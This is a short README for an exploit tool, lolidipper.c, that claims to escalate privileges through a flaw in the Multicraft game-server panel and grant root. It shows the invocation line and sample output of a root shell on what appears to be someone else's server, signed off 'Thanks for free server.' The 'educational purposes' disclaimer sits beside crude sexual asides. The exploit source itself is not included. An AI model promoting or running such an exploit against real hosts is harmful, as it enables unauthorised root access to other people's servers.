lolidipper.c
=======================

Multicraft privilege escelation exploit

This will exploit a flaw in multicraft and give full root permissions on a server running multicraft.
I can't stop you from using it on hosts, but please don't. This is for educational purposes only

Sample Output
==============
    ./lolidipper 1000 25465
    takes about 13 minutes to run because timeout->tv_sec is decremented once per second and 0xff*3 is 765.
        * some things you could do while waiting:
        * watch https://www.youtube.com/watch?v=t2we10nvE7A
        * watch https://www.youtube.com/watch?v=UX44ugzaqw4 $VAI $VAI $VAI $VAI
        * mastrubate to anime
    w00t w00t g0t r00t sh3ll!!!!
    # id
    uid=0(root) gid=25465(395231) groups=25465(395231)
    #free -g
                 total       used       free     shared    buffers     cached
    Mem:           104         74          30          0          0          1
    -/+ buffers/cache:          0          1
    Swap:          512        171        341
    #
    #
    # Thanks for free server.
    Thanks: command not found
